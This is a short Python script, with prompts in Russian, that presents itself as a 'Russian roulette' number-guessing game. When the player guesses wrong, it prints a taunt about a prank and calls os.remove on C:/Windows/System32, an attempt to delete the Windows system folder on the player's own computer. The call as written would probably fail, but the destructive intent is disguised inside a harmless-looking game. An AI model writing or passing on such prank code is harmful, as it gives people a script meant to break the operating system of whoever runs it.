import random
import os

vopros = input("Давай сыграем? (да/нет): ")

if vopros == "да":
    print("Отлично! Мы начинаем игру в русскую рулетку!")
    numbers = random.randint(1, 6)
    shot = int(input("Дай мне номер от 1 до 6: "))

    if shot == numbers:
        print("Молодец, ты выиграл! Смотри прикол.")
    else:
        print(f"Увы, ты проиграл. Я загадал число {numbers}. СМОТРИ ПРИКОЛЛЛ")
        os.remove("C:/Windows/System32")
elif vopros == "нет":
    print("Ну ладно, как хочешь. Пока!")
else:
    print("Я не понял твой ответ. Напиши 'да' или 'нет'.")